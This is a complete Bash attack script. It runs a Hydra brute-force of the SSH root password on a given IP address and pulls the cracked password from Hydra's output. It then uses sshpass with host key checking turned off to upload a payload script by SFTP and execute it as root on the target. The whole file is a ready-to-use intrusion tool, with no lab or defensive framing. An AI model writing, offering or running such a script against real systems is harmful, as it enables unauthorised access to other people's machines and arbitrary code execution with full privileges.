#!/bin/bash

# Check if correct number of arguments are supplied
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <IP_Address> <Password_File> <Local_Script_Path>"
    echo "Example: $0 192.168.1.50 passwords.txt /path/to/payload.sh"
    exit 1
fi

TARGET_IP="$1"
PASS_FILE="$2"
LOCAL_SCRIPT="$3"
REMOTE_SCRIPT_NAME=$(basename "$LOCAL_SCRIPT")

# Check if password file exists
if [ ! -f "$PASS_FILE" ]; then
    echo "[-] Error: Password file '$PASS_FILE' not found."
    exit 1
fi

# Check if local script exists
if [ ! -f "$LOCAL_SCRIPT" ]; then
    echo "[-] Error: Local script '$LOCAL_SCRIPT' not found."
    exit 1
fi

echo "[*] Starting Hydra SSH brute-force against $TARGET_IP for user 'root'"
echo "[*] Using password list: $PASS_FILE"
echo "--------------------------------------------------"

# Temporary file to store Hydra output
OUTPUT_FILE=$(mktemp)

# Run Hydra and save output while displaying it live
hydra -f -l root -P "$PASS_FILE" ssh://"$TARGET_IP" | tee "$OUTPUT_FILE"

# Extract the successfully found password using awk/grep
FOUND_LINE=$(grep "login:" "$OUTPUT_FILE" | head -n 1)
rm -f "$OUTPUT_FILE"

if [ -n "$FOUND_LINE" ]; then
    # Parse out the password from Hydra's success string
    PASSWORD=$(echo "$FOUND_LINE" | awk -F 'password: ' '{print $2}')
    
    echo -e "\n[+] Success! Found credentials: root / $PASSWORD"
    
    # Check for sshpass dependency
    if ! command -v sshpass &> /dev/null; then
        echo "[-] Error: 'sshpass' is required for automated file upload and execution. Install it using: sudo apt install sshpass"
        exit 1
    fi

    echo "[*] Uploading '$LOCAL_SCRIPT' to remote target via SFTP..."
    
    # Use sftp in batch mode to upload the script
    sshpass -p "$PASSWORD" sftp -o StrictHostKeyChecking=no root@"$TARGET_IP" <<EOF
put "$LOCAL_SCRIPT" /tmp/$REMOTE_SCRIPT_NAME
bye
EOF

    # Verify upload was successful
    if [ $? -eq 0 ]; then
        echo "[+] Upload complete. Executing remote script..."
        
        # Execute the script over SSH, make it executable first, then run it
        sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@"$TARGET_IP" "chmod +x /tmp/$REMOTE_SCRIPT_NAME && /tmp/$REMOTE_SCRIPT_NAME"
        
        echo "[+] Execution finished."
    else
        echo "[-] SFTP upload failed."
        exit 1
    fi
else
    echo -e "\n[-] Brute-force finished, but no valid credentials were found."
    exit 1
fi
